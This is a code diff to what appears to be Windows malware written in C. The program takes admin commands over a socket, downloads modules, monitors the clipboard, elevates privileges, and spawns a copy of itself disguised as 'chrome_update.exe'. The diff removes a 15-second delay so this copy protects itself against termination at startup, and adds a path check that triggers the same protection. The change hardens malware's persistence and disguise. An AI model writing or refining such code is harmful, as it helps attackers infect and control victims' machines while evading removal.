@@ -59,9 +59,8 @@ static int download_module(const char *url, const char *out_path) {
     return 1;
 }
 
-/* Auto-protect thread for shadow copies: waits 15 seconds then protects */
+/* Auto-protect thread for shadow copies: protects immediately */
 DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
-    Sleep(15000);  /* Wait 15 seconds after startup before protecting */
     sys_protect_process();
     return 0;
 }
@@ -141,7 +140,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0) {
         sys_spawn_shadow_copy();
-        result = "[Spawned chrome_update.exe — will auto-protect in 15s]";
+        result = "[Spawned chrome_update.exe — will auto-protect immediately on startup]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
         sys_unprotect_process();
@@ -256,10 +255,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Start background services */
     CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
     
-    /* Check if this is a shadow copy — auto-protect after delay */
+    /* Check if this is a shadow copy — auto-protect immediately */
     char *cmdLine = GetCommandLineA();
     if (cmdLine && strstr(cmdLine, "--shadow") != NULL) {
         CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
+    }
+
+    /* Also detect if running from shadow path and protect immediately */
+    char currentPath[MAX_PATH];
+    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+    if (strstr(currentPath, "chrome_update.exe") != NULL) {
+        sys_protect_process();
     }
 
     /* Elevate privileges if needed for full functionality */
